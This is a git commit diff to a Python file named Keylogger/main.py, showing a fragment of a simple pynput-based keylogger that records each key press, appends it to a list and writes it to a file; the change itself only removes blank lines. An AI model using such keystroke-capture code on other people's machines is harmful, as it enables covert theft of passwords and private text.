f270c44a546e3d11dc6ac72550f5169c5d75471b
Adam Bahr <bahrcr7@gmail.com>
2026-04-24 20:54:28 +0300

    Update key press logging functionality
    Refactor key press handling to append keys and write to file.

--- Keylogger/main.py
+++ Keylogger/main.py
@@ -1,11 +1,9 @@
 import pynput
 from pynput.keyboard import Key, Listener
-
 keys = []
 def on_press(key):
     keys.append(key)
     write_file(keys)
-
     try:
         print('alphanumeric key {0} pressed'.format(key.char))
     except AttributeError:
